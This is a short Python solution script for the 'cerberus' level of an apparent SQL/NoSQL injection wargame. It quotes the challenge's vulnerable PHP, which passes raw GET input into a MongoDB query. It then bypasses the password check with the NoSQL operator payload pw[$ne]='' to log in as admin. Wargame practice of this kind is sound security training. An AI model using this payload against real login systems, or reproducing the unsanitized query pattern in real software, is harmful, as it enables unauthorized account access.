#!/usr/bin/env python3
import los


def main():
    '''
    Cerberus 46

    $db = mongodb_connect();
    $query = array(
      "id" => $_GET['id'],
      "pw" => $_GET['pw']
    );
    echo "<hr>query : <strong>".json_encode($query)."</strong><hr><br>";
    $result = mongodb_fetch_array($db->prob_cerberus->find($query));
    if($result['id']) echo "<h2>Hello {$result['id']}</h2>";
    if($result['id'] === "admin") solve("cerberus");
    '''

    url = "https://los.rubiya.kr/chall/cerberus_39f611f3642be62b883da79f092c876d.php"
    cook = los.check_cookies(url)

    param = {'id': 'admin', 'pw[$ne]': ''}

    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Cerberus Clear!')


if __name__ == '__main__':
    main()

